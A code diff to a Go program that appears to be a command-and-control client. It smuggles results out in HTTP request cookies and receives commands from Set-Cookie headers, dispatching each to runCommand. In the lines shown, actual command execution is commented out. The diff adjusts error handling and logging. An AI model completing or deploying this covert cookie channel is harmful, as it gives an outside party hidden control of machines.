@@ -44,25 +44,28 @@ func serverWorker(clientIp net.IP) {
 			//encode data into a response cookie
 
 			request.AddCookie(&myCookie)
-			fmt.Println("Adding cookie")
+			fmt.Printf("Adding cookie: \"%v\"\n", resultStr)
 		default:
 		}
 
 		//send http request to "server"
 		response, err := client.Do(request)
 		if err != nil {
-			panic(err)
+			fmt.Println(err.Error())
+			return
 		}
 
 		//get response
-		cookieStr := response.Header.Get("Set-Cookie")
+		cookies := response.Cookies()
 		//see if there is a command within the cookie returned
-		if cookieStr == "" {
+		if len(cookies) == 0 {
 			continue
 		}
 		//if cookie, exec a command worker with said command
 
-		go runCommand(cookieStr, results)
+		for _, setCookie := range cookies {
+			go runCommand(setCookie.Value, results)
+		}
 
 	}
 }
@@ -71,9 +74,9 @@ func runCommand(command string, results chan<- string) {
 
 	//	commandParts := strings.Split(command, " ")
 
-	fmt.Println(command)
+	fmt.Printf("Command: \"%v\"\n", command)
 
-	results <- command + "done"
+	results <- (command + "done")
 
 	/*
 		//exec
